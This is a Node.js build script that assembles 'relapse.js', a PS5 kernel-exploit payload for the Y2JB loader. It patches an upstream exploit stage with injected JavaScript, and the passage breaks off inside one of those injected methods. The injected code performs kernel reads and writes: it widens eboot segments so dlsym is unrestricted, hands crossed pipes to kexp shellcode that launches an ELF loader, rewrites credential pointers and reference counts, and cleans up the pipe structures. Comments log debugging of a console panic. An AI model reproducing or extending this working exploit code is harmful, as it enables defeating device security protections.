// Builds relapse.js from:
//   * src/relapse.template.js                     (Y2JB host adapters + driver)
//   * <relapse>/src/relapse_exploit.js            (upstream kernel stage)
//   * <relapse>/offsets/*.js                      (upstream window.KRW tables)
//
//   node tools/build.mjs [path/to/Relapse-Exploit] [--set NAME=VALUE]... [--out FILE]
//                          [--target y2jb|autoloader] [--fw 12.60[,11.00]] [--diag]
//
// <relapse> is the upstream Relapse-Exploit checkout. It defaults to the
// submodule vendored at third_party/Relapse-Exploit, so a plain
// `git clone --recursive` is enough to rebuild relapse.js byte for byte. Pass a
// path explicitly to build against a different upstream commit.
//
// --fw keeps only the named offset tables. All 33 cost ~200 KB of the 0x40000
// the Y2JB loader will read, so instrumented builds for one console need this.
//
// --diag includes the instrumentation that production omits to fit under that
// limit (the aio poison snapshot and scrub). --set refuses a flag whose code is
// not in the build, so a missing method cannot masquerade as a negative result.
//
// --set overrides a top-level `const NAME = ...;` tunable in the template, which
// is how the hardware A/B runs are produced (e.g. --set SKIP_HANDOFF=true).
//
// --target selects the host shape:
//   y2jb       (default) a self-running payload for Y2JB's remote JS loader,
//              which evals the script as soon as it arrives.
//   autoloader `async function start_relapse()` returning true/false, for
//              ps5-y2jb-autoloader, whose main.js loads the script with
//              load_localscript() and calls it from its own FW dispatch next to
//              start_lapse()/start_p2jb(). The kexp/elfldr filenames come from
//              that build's BIN_NAME/ELFLDR_NAME when they are in scope.
//
// The upstream kernel stage is copied verbatim except for four marked edits
// (offsets source, kexp handoff, pipe restore, dropped module glue). If
// upstream changes and an edit no longer applies, this script fails loudly
// instead of producing a subtly wrong payload.

import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, "..");
const argv = process.argv.slice(2);
let relapseArg = null;
let outFile = "relapse.js";
let target = "y2jb";
let fwFilter = null;
let diag = false;
const overrides = [];
// The Y2JB remote-JS loader reads at most 0x40000 bytes; anything longer is
// truncated mid-parse and the console reports "SyntaxError: Unexpected end of
// input". Comments live in the template, which is the readable artefact.
let strip = true;
for (let i = 0; i < argv.length; i++) {
  const a = argv[i];
  if (a === "--out") outFile = argv[++i];
  else if (a === "--set") overrides.push(argv[++i]);
  else if (a === "--diag") diag = true;
  else if (a === "--no-strip") strip = false;
  else if (a === "--strip") strip = true;
  else if (a === "--fw")
    fwFilter = argv[++i].split(",").map((x) => x.trim()).filter(Boolean);
  else if (a === "--target") {
    target = argv[++i];
    must(target === "y2jb" || target === "autoloader",
      "--target expects y2jb or autoloader, got " + target);
  }
  else if (a.startsWith("--")) must(false, "unknown option " + a);
  else if (relapseArg === null) relapseArg = a;
  else must(false, "unexpected argument " + a);
}
// Upstream inputs come from the submodule vendored in this repo, pinned by
// .gitmodules. A sibling clone of Relapse-Exploit - the dev layout this builder
// was written in - is still accepted as a fallback, and an explicit path
// argument always wins. Falling through to candidates[0] when neither exists
// makes the ENOENT name the submodule path rather than a stale sibling.
const relapseCandidates = [
  path.join(root, "third_party", "Relapse-Exploit"),
  path.join(root, "..", "Relapse-Exploit"),
];
const relapse = path.resolve(
  relapseArg ||
  relapseCandidates.find((p) =>
    fs.existsSync(path.join(p, "src", "relapse_exploit.js"))) ||
  relapseCandidates[0]
);

// The Y2JB loader reads at most 0x40000 bytes, and the hunt for the
// close-the-host-app panic has grown the instrumentation past that. Production
// builds therefore omit the code behind these flags; --diag puts it back, and
// --set refuses a flag whose code is not in the build rather than letting it fail
// silently at runtime with "this.snapshotAioPoison is not a function".
//
// Keeping production under the limit is not cosmetic: an over-length payload is
// truncated in transit and the console reports SyntaxError, which reads like a bug
// in the payload instead of a build problem.
const DIAG_ONLY = new Set([
  "AIO_POISON_SNAPSHOT", "AIO_POISON_SCRUB", "AIO_CANCEL_ALL",
  "POISON_ID_MAX", "POISON_SNAPSHOT_MAX", "POISON_WAITER_MAX",
  // holdPipeFiles() is not emitted into production. W died with it, X lived
  // without it, and the pipe_dtor() theory it was written against is disproved.
  "FHOLD_PIPES", "FHOLD_AT_RESCUE",
]);

let template = fs.readFileSync(path.join(root, "src/relapse.template.js"), "utf8");
for (const kv of overrides) {
  const eq = kv.indexOf("=");
  must(eq > 0, "--set expects NAME=VALUE, got " + kv);
  const name = kv.slice(0, eq);
  const value = kv.slice(eq + 1);
  const re = new RegExp("^(\\s*const " + name + " = )[^;\\n]+;", "m");
  must(re.test(template), "--set: no tunable named " + name);
  must(diag || !DIAG_ONLY.has(name),
    "--set " + name + " needs --diag: that code is omitted from production " +
    "builds to stay under the loader's 0x40000 limit");
  template = template.replace(re, "$1" + value + ";");
  console.log("build.mjs: override " + name + " = " + value);
}
const upstreamPath = path.join(relapse, "src/relapse_exploit.js");
const upstream = fs.readFileSync(upstreamPath, "utf8");
const offsetsDir = path.join(relapse, "offsets");

function must(condition, message) {
  if (!condition) {
    console.error("build.mjs: " + message);
    process.exit(1);
  }
}

function replaceOnce(text, from, to, label) {
  const first = text.indexOf(from);
  must(first >= 0, "edit '" + label + "' did not apply - upstream changed?");
  must(text.indexOf(from, first + 1) < 0, "edit '" + label + "' is ambiguous");
  return text.slice(0, first) + to + text.slice(first + from.length);
}

// ---------------------------------------------------------------------------
// 1. upstream kernel stage
// ---------------------------------------------------------------------------
const importLine = 'import { int64 } from "./utils/int64.js";\n';
must(upstream.startsWith(importLine), "unexpected upstream header (import line)");
let stage = upstream.slice(importLine.length);

// int64 comes from the template's adapter section
must(!stage.includes("int64.prototype"), "upstream defines int64 itself now");

// module glue: the driver instantiates KernelExploit directly
const runner = `export async function runKernelExploit(p, chain, log) {
  return new KernelExploit(p, chain, log).run();
}

`;
must(stage.includes(runner), "could not find the runKernelExploit export wrapper");
stage = stage.replace(runner, "");

// the template already defines sleep() in this scope
stage = replaceOnce(
  stage,
  "const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));\n",
  "",
  "sleep redefinition",
);

must(stage.startsWith("\nconst AF_UNIX"), "unexpected upstream const block");
must(stage.includes("class KernelExploit {"), "could not find `class KernelExploit {`");

// edit 1/9: take the offsets table from the caller, not from window.KRW
stage = replaceOnce(
  stage,
  "  constructor(p, chain, log) {",
  "  constructor(p, chain, log, off) {",
  "constructor signature",
);
stage = replaceOnce(
  stage,
  `    this.off = window.KRW;
    if (!this.off) throw new Error("offsets/" + window.fw_str + ".js did not define window.KRW");`,
  `    this.off = off;
    this.handedOff = false;
    this.oidsRestored = false;
    this.disarmed = false;
    this.ebootOrig = null;
    this.ebootRestored = false;`,
  "offsets source",
);
must(!stage.includes("window."), "upstream still references window.*");

// edit 2/9: hand the jailbreak to Y2JB's bundled kexp + elfldr instead of
// running Relapse's own kexp.js (same shellcode, same elfldr, already shipped
// inside the framework - download0/cache/splash_screen/.../aioshellcode.js).
const shellcodeStart = stage.indexOf("  // shellcode\n  async launchShellcode() {");
must(shellcodeStart >= 0, "edit 'launchShellcode' did not apply - upstream changed?");
const shellcodeEnd = stage.indexOf("\n  // restore\n", shellcodeStart);
must(shellcodeEnd > shellcodeStart, "could not find the end of launchShellcode()");
stage =
  stage.slice(0, shellcodeStart) +
  `  // shellcode
  async launchShellcode() {
    await this.restoreThreadAttributes();

    // Prepare the kernel the way lapse.js and the p2jb port do before handing
    // it to ufm42's shellcode: unrestricted dlsym, pinned pipe files.
    //
    // ORDER MATTERS, and so does the primitive: this runs BEFORE restoreOids()
    // and uses the fast pipe path (readKernel64/writeKernel64), because the
    // slow path reads through the sysctl-OID window that restoreOids() tears
    // down. Doing it the other way round silently read garbage, skipped the
    // dlsym patch and spawned the shellcode without it - which is what killed
    // the console at handoff 5/6.
    if (typeof PREPARE_FOR_KEXP !== "undefined" && PREPARE_FOR_KEXP && this.crossed) {
      const isKptr = (v) => !!v && (v.hi >>> 16) === 0xffff;
      const rdPtr = async (addr) => {
        const v = await this.readKernel64(addr);
        return isKptr(v) ? v : null;
      };

      const dynlibPtr = await rdPtr(this.curproc.add32(this.off.proc.dynlib));
      if (!dynlibPtr) {
        await asay("handoff 0a: p_dynlib is not a kernel pointer - dlsym patch skipped");
      } else {
        // *(p_dynlib + 0x00) -> eboot module, *(module + 0x40) -> segments;
        // segments[0].addr = 0 and .size = ~0 is what makes dlsym unrestricted.
        const eboot = (typeof WIDEN_EBOOT === "undefined" || WIDEN_EBOOT)
          ? await rdPtr(dynlibPtr.add32(0x00)) : null;
        const segments = eboot ? await rdPtr(eboot.add32(0x40)) : null;
        if (!eboot && typeof WIDEN_EBOOT !== "undefined" && !WIDEN_EBOOT) {
          await asay("handoff 0a: eboot widening disabled by WIDEN_EBOOT");
        }
        if (segments) {
          const origAddr = await this.readKernel64(segments.add32(0x08));
          const origSize = await this.readKernel64(segments.add32(0x10));
          const okAddr = await this.writeKernel64(segments.add32(0x08), 0, 0);
          const okSize = await this.writeKernel64(segments.add32(0x10),
            0xffffffff, 0xffffffff);
          const back = await this.readKernel64(segments.add32(0x10));
          if (okAddr && okSize) {
            this.ebootSegments = segments;
            this.ebootOrig = { addr: origAddr, size: origSize };
          }
          await asay("handoff 0a: eboot segments widened for dlsym (dynlib 0x" +
            dynlibPtr.toString() + ", eboot 0x" + eboot.toString() +
            ", segments 0x" + segments.toString() + ", wrote " +
            (okAddr && okSize ? "ok" : "FAILED") + ", size reads back 0x" +
            back.toString() + ")");
        } else {
          await asay("handoff 0a: eboot segments not found (eboot " +
            (eboot ? "0x" + eboot.toString() : "invalid") +
            ") - the shellcode may not resolve its imports");
        }

        // fhold the pipe files, so the host's exit path never reaches
        // pipe_dtor() and the crossed pipes are never torn down.
        if (typeof FHOLD_PIPES === "undefined" || FHOLD_PIPES)
          await this.holdPipeFiles("handoff 0b");
      }
    }

    // Prove the resolver can actually resolve something *before* the shellcode
    // is spawned: a failure here is a logged line instead of a dead console.
    if (typeof PROBE_DLSYM !== "undefined" && PROBE_DLSYM &&
        typeof dlsym === "function") {
      for (const sym of ["memcpy", "sysctlbyname", "pthread_create"]) {
        try {
          const addr = dlsym(LIBKERNEL_HANDLE, sym);
          await asay("handoff 0c: dlsym(libkernel, " + sym + ") = 0x" +
            BigInt(addr).toString(16));
        } catch (e) {
          await asay("handoff 0c: dlsym(libkernel, " + sym + ") FAILED: " +
            e.message + " - the shellcode's import resolver will fail too");
        }
      }
    }

    const allproc = big(this.kaddr(this.off.allproc));
    const master_pipe = [BigInt(this.master.readFd), BigInt(this.master.writeFd)];
    const victim_pipe = [BigInt(this.victim.readFd), BigInt(this.victim.writeFd)];

    // ufm42's kexp shellcode drives the crossed pipes from its own thread;
    // Y2JB's lapse.js and the p2jb Y2JB port both hand over non-blocking fds.
    for (const fd of master_pipe.concat(victim_pipe))
      await this.sysInt(SYS_FCNTL, fd, F_SETFL, O_NONBLOCK);

    this.report("kexp", "handoff (allproc 0x" + allproc.toString(16) +
      ", master " + master_pipe.join("/") + ", victim " +
      victim_pipe.join("/") + ")");

    // Not Y2JB's load_aioshellcode(): that one hands the shellcode a malloc'd
    // elfldr image, whose backing-store pointer comes back V8-sandbox tagged on
    // newer YouTube apps (0xd00000027fa00020 on 01.000.030) and faults the
    // console. handoff_kexp() mmaps every buffer the shellcode dereferences.
    if (typeof DIAGNOSE_AFTER_HANDOFF !== "undefined" && DIAGNOSE_AFTER_HANDOFF) {
      await asay("diag: snapshotting the kernel state the blob is about to inherit");
      await this.snapshotKernelState("diag-before");
    }
    if (typeof SKIP_HANDOFF !== "undefined" && SKIP_HANDOFF) {
      this.report("kexp", "SKIP_HANDOFF: not starting the blob. This is a " +
        "Relapse-only jailbreak (escalate + rescue), for bisecting the " +
        "close-the-host-app panic");
      return true;
    }
    await handoff_kexp(allproc, master_pipe, victim_pipe);

    this.handedOff = true;
    this.report("kexp", "elfldr should now be listening on :9021");

    if (typeof DIAGNOSE_AFTER_HANDOFF !== "undefined" && DIAGNOSE_AFTER_HANDOFF) {
      await asay("diag: snapshotting again - the diff is what the blob changed");
      await this.snapshotKernelState("diag-after");
    }
    if (typeof STABILIZE_CREDS !== "undefined" && STABILIZE_CREDS) {
      await asay("stabilize: p2jb-style cred migration");
      await this.stabilizeCreds("stabilize");
    }

    // Put eboot's segment descriptors back. Widening them (addr=0, size=~0) is
    // what lets the kexp shellcode resolve its imports in this host, but it is
    // also kernel state that gets walked when the process is torn down - and it
    // is the one thing upstream Relapse never does, which lines up with "closing
    // the browser survives, closing YouTube black-screens the console".
    if (typeof RESTORE_EBOOT_AFTER_HANDOFF !== "undefined" &&
        RESTORE_EBOOT_AFTER_HANDOFF && this.ebootOrig) {
      await asay("handoff 7: restoring the eboot segment descriptors");
      const seg = this.ebootSegments;
      const wa = await this.writeKernel64(seg.add32(0x08),
        this.ebootOrig.addr.low, this.ebootOrig.addr.hi);
      const wz = await this.writeKernel64(seg.add32(0x10),
        this.ebootOrig.size.low, this.ebootOrig.size.hi);
      const back = await this.readKernel64(seg.add32(0x10));
      // Read the address back too. "verified" used to cover the size alone while
      // the address was only checked for the write call returning true, and the
      // addr it printed was ebootOrig.addr - the value we intended, not the one in
      // the kernel. A line reading "restored ... (verified)" that prints an intent
      // is the same mistake as fhold reporting 4/4 from the write instead of the
      // readback, and it cost a false lead here: 0xc40000 against an earlier boot's
      // 0x7cbf4000 looked like corruption and was only ASLR.
      const backAddr = await this.readKernel64(seg.add32(0x08));
      const same = back.low === this.ebootOrig.size.low &&
        back.hi === this.ebootOrig.size.hi &&
        backAddr.low === this.ebootOrig.addr.low &&
        backAddr.hi === this.ebootOrig.addr.hi;
      this.ebootRestored = same;
      this.report("kexp", "eboot segments restored: addr reads back 0x" +
        backAddr.toString() + " (want 0x" + this.ebootOrig.addr.toString() +
        "), size 0x" + back.toString() + " (want 0x" +
        this.ebootOrig.size.toString() + ") (" +
        (wa && wz && same ? "verified" : "MISMATCH") + ")");
    }

    // Everything else is upstream's rescue(), in upstream's order:
    // restoreOids -> restorePipes -> releaseAioWorkers -> closeScratch.
    return true;
  }

` +
  stage.slice(shellcodeEnd + 1);

// edit 3/9: struct file* helper used by the kexp preparation above
stage = replaceOnce(
  stage,
  "  async findPipe(fdp, fd, label) {",
  `  // struct file* behind one of our descriptors (same walk as findPipe), via
  // the fast pipe path so it still works after the sysctl OIDs are restored.
  async fileOf(fd) {
    const isKptr = (v) => !!v && (v.hi >>> 16) === 0xffff;
    const rdPtr = async (addr) => {
      const v = await this.readKernel64(addr);
      return isKptr(v) ? v : null;
    };
    const fdp = await rdPtr(this.curproc.add32(this.off.proc.fd));
    if (!fdp) return null;
    const table = await rdPtr(fdp.add32(this.off.filedesc.files));
    if (!table) return null;
    const entry = this.off.filedescTable.ofiles + fd * this.off.filedescTable.entryStride;
    return rdPtr(table.add32(entry));
  }

  async findPipe(fdp, fd, label) {`,
  "fileOf helper",
);

// edit 4/9: post-handoff forensics + p2jb-style cred stabilization
stage = replaceOnce(
  stage,
  "  async restorePipes() {",
  `  // Dump the process's kernel-visible state so "what does the kexp blob leave
  // behind that kills the console when the host app is closed" is a measurement
  // rather than a guess. Read-only, and called both before and after the
  // handoff - the diff is exactly what the shellcode changed.
  //
  // Every pointer is range-checked (top 16 bits set) before being dereferenced,
  // so a blob that repoints p_ucred at process memory shows up in the log
  // instead of taking the kernel with it.
  async snapshotKernelState(label) {
    const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
    const H = (v) => (v === null ? "-" :
      (K(v) ? "0x" + v.toString() : "0x" + v.toString() + "!USER"));
    const same = (a, b) => K(a) && K(b) && a.low === b.low && a.hi === b.hi;
    const hex = (v) => "0x" + (v >>> 0).toString(16);
    const out = [];
    try {
      if (!this.curproc) await this.findCurrentProcess();
      const p = this.curproc;
      if (!p) { this.report(label, "curproc unavailable - snapshot skipped"); return; }
      const off = this.off;

      const ucred = await this.readKernel64(p.add32(off.proc.ucred));
      const pfd = await this.readKernel64(p.add32(off.proc.fd));
      const pid = await this.readKernel32(p.add32(off.proc.pid));
      out.push("proc " + H(p) + " pid " + pid + " p_ucred " + H(ucred));

      if (K(ucred)) {
        out.push("ucred cr_ref " + (await this.readKernel32(ucred)) +
          " uid " + (await this.readKernel32(ucred.add32(off.ucred.uid))) +
          " ruid " + (await this.readKernel32(ucred.add32(off.ucred.ruid))) +
          " ngroups " + (await this.readKernel32(ucred.add32(off.ucred.ngroups))) +
          " authid " + H(await this.readKernel64(ucred.add32(off.ucred.sceAuthId))) +
          " caps0 " + H(await this.readKernel64(ucred.add32(off.ucred.sceCaps))) +
          " attrs " + hex(await this.readKernel32(ucred.add32(off.ucred.sceAttrs))));
      }

      if (K(pfd)) {
        const table = await this.readKernel64(pfd.add32(off.filedesc.files));
        out.push("fdesc table " + H(table) +
          " cdir " + H(await this.readKernel64(pfd.add32(off.filedesc.cdir))) +
          " rdir " + H(await this.readKernel64(pfd.add32(off.filedesc.rdir))) +
          " jdir " + H(await this.readKernel64(pfd.add32(off.filedesc.jdir))));
        if (K(table)) {
          const nfiles = await this.readKernel32(table.add32(off.filedescTable.nfiles));
          const ofiles = table.add32(off.filedescTable.ofiles);
          const stride = off.filedescTable.entryStride;
          const cap = Math.min(nfiles, 512);
          let live = 0, mismatch = 0, user = 0;
          const odd = [];
          for (let i = 0; i < cap; i++) {
            const fp = await this.readKernel64(ofiles.add32(i * stride));
            if (!K(fp)) continue;
            live++;
            const fcred = await this.readKernel64(fp.add32(0x10));
            if (!K(fcred)) {
              user++;
              if (odd.length < 5) odd.push("fd" + i + " f_cred " + H(fcred));
            } else if (!same(fcred, ucred)) {
              mismatch++;
              if (odd.length < 5) odd.push("fd" + i + " f_cred " + H(fcred) +
                " f_count " + (await this.readKernel32(fp.add32(0x28))));
            }
          }
          out.push("files nfiles " + nfiles + " scanned " + cap + " live " + live +
            " f_cred!=p_ucred " + mismatch + " non-kernel " + user);
          for (const o of odd) out.push("  " + o);
        }
      }

      const td0 = await this.readKernel64(p.add32(0x10));
      let td = td0, n = 0, tdMismatch = 0, tdUser = 0;
      const lines = [];
      while (K(td) && n < 500) {
        n++;
        const tdproc = await this.readKernel64(td.add32(0x08));
        if (!same(tdproc, p)) { lines.push("td " + H(td) + " td_proc MISMATCH"); break; }
        const tu = await this.readKernel64(td.add32(0x140));
        if (!K(tu)) { tdUser++; lines.push("td " + H(td) + " td_ucred " + H(tu)); }
        else if (!same(tu, ucred)) {
          tdMismatch++;
          if (lines.length < 6) lines.push("td " + H(td) + " td_ucred " + H(tu));
        }
        td = await this.readKernel64(td.add32(0x10));
      }
      out.push("threads " + n + " td_ucred!=p_ucred " + tdMismatch +
        " non-kernel " + tdUser);
      for (const l of lines) out.push("  " + l);

      const pd = await this.readKernel64(p.add32(off.proc.dynlib));
      if (K(pd))
        out.push("dynlib " + H(pd) +
          " syscallStart " + H(await this.readKernel64(pd.add32(off.dynlib.syscallStart))) +
          " end " + H(await this.readKernel64(pd.add32(off.dynlib.syscallEnd))) +
          " restrictFlags " + H(await this.readKernel64(pd.add32(off.dynlib.restrictFlags))));

      if (this.master && this.victim && this.master.pipe && this.victim.pipe)
        out.push("pipes master " + H(this.master.pipe) + ".buffer " +
          H(await this.readKernel64(this.master.pipe.add32(off.pipe.buffer))) +
          " | victim " + H(this.victim.pipe) + ".buffer " +
          H(await this.readKernel64(this.victim.pipe.add32(off.pipe.buffer))));
    } catch (e) {
      out.push("snapshot failed: " + e.message);
    }
    for (const line of out) this.report(label, line);
  }

  // The p2jb port's close-panic fix, ported verbatim: point every f_cred and
  // td_ucred that is not the process cred at the process cred, and pay for the
  // extra references in cr_ref so the teardown refcounts still balance. Only
  // touches what the snapshot found.
  async stabilizeCreds(label) {
    const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
    const H = (v) => (v === null ? "-" : "0x" + v.toString());
    const same = (a, b) => K(a) && K(b) && a.low === b.low && a.hi === b.hi;
    try {
      if (!this.curproc) await this.findCurrentProcess();
      const p = this.curproc;
      const b = p ? await this.readKernel64(p.add32(this.off.proc.ucred)) : null;
      if (!K(b)) {
        this.report(label, "p_ucred " + H(b) + " is not a kernel pointer - skipped");
        return;
      }

      let fdMigrated = 0;
      const pfd = await this.readKernel64(p.add32(this.off.proc.fd));
      const table = K(pfd) ?
        await this.readKernel64(pfd.add32(this.off.filedesc.files)) : null;
      if (K(table)) {
        const nfiles = await this.readKernel32(table.add32(this.off.filedescTable.nfiles));
        const ofiles = table.add32(this.off.filedescTable.ofiles);
        const stride = this.off.filedescTable.entryStride;
        for (let i = 0; i < Math.min(nfiles, 512); i++) {
          const fp = await this.readKernel64(ofiles.add32(i * stride));
          if (!K(fp)) continue;
          const fcred = await this.readKernel64(fp.add32(0x10));
          if (!K(fcred) || same(fcred, b)) continue;
          if (await this.writeKernel64(fp.add32(0x10), b.low, b.hi)) fdMigrated++;
        }
      }

      let tdMigrated = 0;
      let td = await this.readKernel64(p.add32(0x10));
      for (let n = 0; K(td) && n < 500; n++) {
        const tdproc = await this.readKernel64(td.add32(0x08));
        if (!same(tdproc, p)) break;
        const tu = await this.readKernel64(td.add32(0x140));
        if (K(tu) && !same(tu, b) &&
            await this.writeKernel64(td.add32(0x140), b.low, b.hi)) tdMigrated++;
        td = await this.readKernel64(td.add32(0x10));
      }

      const total = fdMigrated + tdMigrated;
      if (total > 0) {
        const before = await this.readKernel32(b);
        await this.writeKernel32(b, before + total);
        this.report(label, total + " cred refs migrated (" + fdMigrated +
          " f_cred, " + tdMigrated + " td_ucred), cr_ref " + before + " -> " +
          (await this.readKernel32(b)));
      } else {
        this.report(label, "nothing to migrate - every f_cred and td_ucred " +
          "already points at p_ucred " + H(b) + " (cr_ref " +
          (await this.readKernel32(b)) + ")");
      }
    } catch (e) {
      this.report(label, "failed: " + e.message);
    }
  }

  async restorePipes() {`,
  "forensics",
);

// Injected method: hold the four pipe files so the exit path cannot tear them down.
//
// DIAGNOSTIC ONLY, and not for size reasons. Build W ran the full production path
// with this on and died 4 s after exit; Build X is identical with FHOLD_PIPES=false
// and lived through 60 pings. Writing f_count = 0x10000 leaks four struct file
// objects past process exit, and it was added to keep that exit path away from
// pipe_dtor() - a theory Build V disproved, since pipe_dtor() is harmless once the
// pipes hold their real buffers. The mitigation outlived its premise and became one
// of the two causes. It stays reachable under --diag for forensics; production
// neither contains it nor accepts the flags that call it.
if (diag) {
stage = replaceOnce(
  stage,
  "  async restorePipes() {",
  `  // Increment f_count on the four pipe files, then read it back.
  //
  // With the count held above zero, closing a descriptor at process exit only
  // drops it to 1, so pipe_dtor() and pipe_free_kmem() never run for these pipes.
  // That makes this the cheapest separator between the two explanations left for
  // the close-the-host-app panic: either the crossing corrupts something the exit
  // path walks, or freeing the armed victim pipe is itself the fault -
  // restorePipes() leaves victim.buffer pointing at the master's struct with size
  // 16384, which is kmem_free() being handed another pipe's struct.
  //
  // The readback matters, and it already caught something. Every production log
  // says "handoff 0b: fhold on 4/4", but that count came from writeKernel32()
  // reporting success, not from re-reading the field. The first build that did read
  // it back got victim.write 1->1 and victim.read 2->4: the write did not land on
  // one file and something moved the other by two. So the hold production has been
  // relying on is unverified, which also means "production panics despite holding
  // the files" was never established.
  async holdPipeFiles(label) {
    if (!this.crossed) {
      this.report(label, "skipped - the pipes were never crossed");
      return 0;
    }
    const isKptr = (v) => !!v && (v.hi >>> 16) === 0xffff;
    const names = ["master.read", "master.write", "victim.read", "victim.write"];
    const fds = [this.master.readFd, this.master.writeFd,
      this.victim.readFd, this.victim.writeFd];
    // Write a large count rather than rc + 1, and retry until the readback shows
    // it stuck. An increment can be undone before we look: pipe() cross-holds the
    // two ends, so victim.read reads back as 2 on a pipe nothing else has touched,
    // and the first attempt at this lost a hold outright - victim.write came back
    // at 1, meaning its pipe would still have been torn down at exit. A value this
    // far above any real reference count survives concurrent fdrop().
    const HOLD = 0x10000;
    let verified = 0;
    const detail = [];
    for (let i = 0; i < fds.length; i++) {
      const fp = await this.fileOf(fds[i]);
      if (!isKptr(fp)) { detail.push(names[i] + ":no-file"); continue; }
      const rc = await this.readKernel32(fp.add32(0x28));
      if (rc <= 0 || rc >= HOLD) {
        detail.push(names[i] + ":bad-fcount-" + rc);
        continue;
      }
      let back = 0;
      for (let attempt = 0; attempt < 3 && back < HOLD; attempt++) {
        if (!await this.writeKernel32(fp.add32(0x28), HOLD)) continue;
        back = await this.readKernel32(fp.add32(0x28));
      }
      if (back >= HOLD) {
        verified++;
        detail.push(names[i] + ":" + rc + "->" + back);
      } else {
        detail.push(names[i] + ":" + rc + "->" + back + " STUCK");
      }
    }
    this.report(label, "fhold " + verified + "/4 verified [" + detail.join(", ") +
      "]" + (verified === 4 ? " - the exit path cannot reach pipe_dtor()" :
        " - INCOMPLETE, teardown may still run"));
    return verified;
  }

  async restorePipes() {`,
  "holdPipeFiles",
);
}

// edit 5/9: tear down both crossed pipes, not just one
stage = replaceOnce(
  stage,
  "  async restorePipes() {",
  `  // Upstream's restorePipes() can only ever disarm ONE of the two pipes: it
  // un-crosses by aiming the victim at the master pipe struct and writing
  // zeroes through it, which necessarily leaves victim.buffer pointing at the
  // master struct. Whichever pipe is still armed when the host process exits
  // makes the kernel's pipe teardown call vm_map_remove() on a range that was
  // never a pipe buffer - on hardware that is an immediate black screen when
  // the YouTube app is closed.
  //
  // So disarm the victim through the fast (pipe) path first, then the master
  // through the slow (sysctl-OID) path, which does not touch the pipes at all.
  // That needs the OIDs still hijacked, i.e. this must run before
  // restoreOids(). Leaves buffer/count/in/out/size zero on both, so the free
  // path skips vm_map_remove for each.
  async disarmPipes() {
    if (!this.crossed || this.disarmed) return this.disarmed;
    const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
    const master = this.master.pipe;
    const victim = this.victim.pipe;

    // 1. victim.buffer = NULL through the crossed pair. This is the last fast
    //    write available: afterwards the victim has no buffer to write through.
    const victimOk = await this.writeKernel64(victim.add32(buffer), 0, 0);

    // 2. everything else, master.buffer included, through the slow sysctl-OID path.
    const masterOk = (await this.kwrite64(master.add32(buffer), new int64(0, 0))) === 0;
    let fields = 0;
    for (const p of [master, victim])
      for (const off of [count, inOff, outOff, size])
        if ((await this.kwrite32(p.add32(off), 0)) === 0) fields++;

    const mb = await this.kread64(master.add32(buffer));
    const vb = await this.kread64(victim.add32(buffer));
    const clean = mb.value.low === 0 && mb.value.hi === 0 &&
      vb.value.low === 0 && vb.value.hi === 0;

    this.disarmed = clean;
    this.report("pipes", clean
      ? "both pipe buffers disarmed (" + fields + "/8 head fields zeroed)"
      : "DISARM INCOMPLETE (master.buffer 0x" + mb.value.toString() +
        ", victim.buffer 0x" + vb.value.toString() + ", victimOk=" + victimOk +
        ", masterOk=" + masterOk + ") - closing the host app may still panic");
    return clean;
  }

  // Record both pipes' real buffer addresses and sizes before crossPipes()
  // overwrites them.
  //
  // Every teardown written so far zeroed the buffer field instead - restorePipes,
  // disarmPipes, pipeclean.elf, Build O - which orphans the real allocation and
  // leaves the struct at buffer=0/size=0, a state no live pipe is ever in. Build P
  // exits cleanly with its real buffers in place. Build U panics with them zeroed,
  // everything else about the two runs being equal. Restoring them is the one pipe
  // end-state that had never been tried.
  async savePipeBuffers() {
    const { buffer, size } = this.off.pipe;
    const bm = await this.kread64(this.master.pipe.add32(buffer));
    const bs = await this.kread32(this.master.pipe.add32(size));
    const bv = await this.kread64(this.victim.pipe.add32(buffer));
    const vs = await this.kread32(this.victim.pipe.add32(size));
    if (bm.rv !== 0 || bv.rv !== 0) {
      this.report("pipes", "could not read the real buffers before crossing - " +
        "restoreRealBuffers() will have nothing to restore");
      return false;
    }
    this.savedBuffers = { master: bm.value, masterSize: bs.value,
      victim: bv.value, victimSize: vs.value };
    this.report("pipes", "saved real buffers before crossing: master 0x" +
      bm.value.toString() + " size " + bs.value + ", victim 0x" +
      bv.value.toString() + " size " + vs.value);
    return true;
  }

  // Put both structs back to what an ordinary used-but-empty pipe looks like: its
  // own buffer, its own size, nothing buffered. Slow window only - the pair is
  // already uncrossed by the time this runs, so it needs SKIP_OID_RESTORE to leave
  // the window hijacked. pipe_dtor() then frees the right memory and takes the
  // right amount off amountpipekva, instead of skipping the free and leaking it.
  async restoreRealBuffers() {
    const s = this.savedBuffers;
    if (!s) {
      this.report("pipes", "no saved buffers - cannot restore");
      return false;
    }
    const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
    let ok = 0;
    const tried = 10;
    for (const [p, b, sz] of [[this.master.pipe, s.master, s.masterSize],
      [this.victim.pipe, s.victim, s.victimSize]]) {
      if ((await this.kwrite64(p.add32(buffer), b)) === 0) ok++;
      if ((await this.kwrite32(p.add32(size), sz)) === 0) ok++;
      for (const off of [count, inOff, outOff])
        if ((await this.kwrite32(p.add32(off), 0)) === 0) ok++;
    }
    const mb = await this.kread64(this.master.pipe.add32(buffer));
    const vb = await this.kread64(this.victim.pipe.add32(buffer));
    const good = mb.value.low === s.master.low && mb.value.hi === s.master.hi &&
      vb.value.low === s.victim.low && vb.value.hi === s.victim.hi;
    this.disarmed = good;
    this.report("pipes", good
      ? "both real buffers restored and verified (" + ok + "/" + tried +
        " writes ok) - the pair now looks like an ordinary used pipe"
      : "BUFFER RESTORE FAILED (" + ok + "/" + tried + " writes, master 0x" +
        mb.value.toString() + " want 0x" + s.master.toString() + ", victim 0x" +
        vb.value.toString() + " want 0x" + s.victim.toString() +
        ") - closing the host app may still panic");
    return good;
  }

  // restoreOids() through the slow window instead of the crossed pipes, for the
  // teardown order where the pipes are already disarmed. Same writes, same
  // checks; only the primitive differs.
  async restoreOidsSlow() {
    const { a, b, c, originalKind } = this.off.oid;
    // Every write is logged after it lands, and the window this runs through is
    // the one being restored - so if the console dies in here, the last line
    // received is the write that killed it.
    const step = async (what, fn) => {
      const rv = await fn();
      this.report("Cleanup", "slow-oid " + what + (rv === undefined ? " done" : " rv " + rv));
      return rv;
